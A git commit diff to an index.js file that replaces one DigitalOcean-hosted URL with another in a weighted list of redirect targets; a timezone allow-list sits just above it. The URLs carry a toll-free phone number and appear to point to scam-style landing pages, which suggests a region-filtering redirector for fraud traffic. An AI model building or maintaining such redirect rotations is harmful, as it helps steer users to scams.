ef72a94a44826b54986ced4f73826592b9e62ddc
paalakash <palaksh452@gmail.com>
2026-06-23 08:11:55 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://king-prawn-app-jw9yp.ondigitalocean.app/werrx01USAHTML/?bcda=1800 034 661", weight: 1.0 }
+    { url: "https://walrus-app-2ekwm.ondigitalocean.app/werrx01USAHTML/?bcda=1800 034 661", weight: 1.0 }
     
 ];
 
